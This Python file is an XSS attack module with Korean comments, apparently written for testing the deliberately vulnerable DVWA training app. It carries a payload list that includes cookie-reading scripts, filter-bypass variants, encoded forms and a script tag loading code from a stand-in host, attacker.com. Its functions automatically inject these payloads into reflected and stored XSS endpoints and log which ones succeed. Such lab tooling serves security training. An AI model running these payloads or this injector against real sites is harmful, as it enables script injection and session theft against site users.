"""
XSS Attack Module
DVWA Cross-Site Scripting 공격 모듈
"""

import time
from utils.logger import log_attack

# XSS 페이로드 목록
PAYLOADS = [
    # Reflected XSS
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg/onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",

    # DOM-based XSS
    "<img src=x onerror=console.log(document.domain)>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",

    # Bypass 시도
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<SCRIPT SRC=http://attacker.com/xss.js></SCRIPT>",

    # Event handlers
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",

    # HTML5 tags
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",

    # Encoded payloads
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
]

def run_attack(session, delay=1):
    """
    XSS 공격 실행

    Args:
        session: DVWA 세션 객체
        delay: 요청 간 지연 시간(초)

    Returns:
        dict: 공격 결과 통계
    """
    results = {
        'success': False,
        'attempts': 0,
        'successful': 0,
        'findings': []
    }

    # Reflected XSS 테스트
    print("  [*] Reflected XSS 테스트 중...")
    reflected_results = test_reflected_xss(session, delay)
    results['attempts'] += reflected_results['attempts']
    results['successful'] += reflected_results['successful']
    results['findings'].extend(reflected_results['findings'])

    # Stored XSS 테스트
    print("  [*] Stored XSS 테스트 중...")
    stored_results = test_stored_xss(session, delay)
    results['attempts'] += stored_results['attempts']
    results['successful'] += stored_results['successful']
    results['findings'].extend(stored_results['findings'])

    if results['successful'] > 0:
        results['success'] = True

    print(f"\n[*] XSS 공격 완료: {results['successful']}/{results['attempts']} 성공\n")
    return results

def test_reflected_xss(session, delay):
    """Reflected XSS 테스트"""
    results = {
        'attempts': 0,
        'successful': 0,
        'findings': []
    }

    xss_url = f"{session.base_url}/vulnerabilities/xss_r/"

    for payload in PAYLOADS[:15]:  # Reflected XSS용 페이로드만 사용
        results['attempts'] += 1

        try:
            params = {
                'name': payload,
                'Submit': 'Submit'
            }

            response = session.session.get(xss_url, params=params)

            # XSS 성공 여부 확인 (페이로드가 그대로 반영되는지)
            if payload in response.text or payload.lower() in response.text.lower():
                results['successful'] += 1
                results['findings'].append({
                    'type': 'Reflected XSS',
                    'payload': payload,
                    'status_code': response.status_code
                })

                log_attack(
                    'XSS_REFLECTED',
                    'SUCCESS',
                    f"Payload: {payload}",
                    response.status_code,
                    len(response.text)
                )
                print(f"    [+] Reflected XSS 성공: {payload[:50]}")
            else:
                log_attack(
                    'XSS_REFLECTED',
                    'FAILED',
                    f"Payload: {payload}",
                    response.status_code,
                    len(response.text)
                )

            time.sleep(delay)

        except Exception as e:
            log_attack(
                'XSS_REFLECTED',
                'ERROR',
                f"Payload: {payload}, Error: {str(e)}",
                0,
                0
            )

    return results

def test_stored_xss(session, delay):
    """Stored XSS 테스트"""
    results = {
        'attempts': 0,
        'successful': 0,
        'findings': []
    }

    xss_url = f"{session.base_url}/vulnerabilities/xss_s/"

    for payload in PAYLOADS[:10]:  # Stored XSS용 일부 페이로드 사용
        results['attempts'] += 1

        try:
            # Stored XSS 페이로드 전송
            data = {
                'txtName': 'Test User',
                'mtxMessage': payload,
                'btnSign': 'Sign Guestbook'
            }

            response = session.session.post(xss_url, data=data)

            # 페이로드가 저장되었는지 확인
            verify_response = session.session.get(xss_url)

            if payload in verify_response.text:
                results['successful'] += 1
                results['findings'].append({
                    'type': 'Stored XSS',
                    'payload': payload,
                    'status_code': response.status_code
                })

                log_attack(
                    'XSS_STORED',
                    'SUCCESS',
                    f"Payload: {payload}",
                    response.status_code,
                    len(response.text)
                )
                print(f"    [+] Stored XSS 성공: {payload[:50]}")
            else:
                log_attack(
                    'XSS_STORED',
                    'FAILED',
                    f"Payload: {payload}",
                    response.status_code,
                    len(response.text)
                )

            time.sleep(delay)

        except Exception as e:
            log_attack(
                'XSS_STORED',
                'ERROR',
                f"Payload: {payload}, Error: {str(e)}",
                0,
                0
            )

    return results
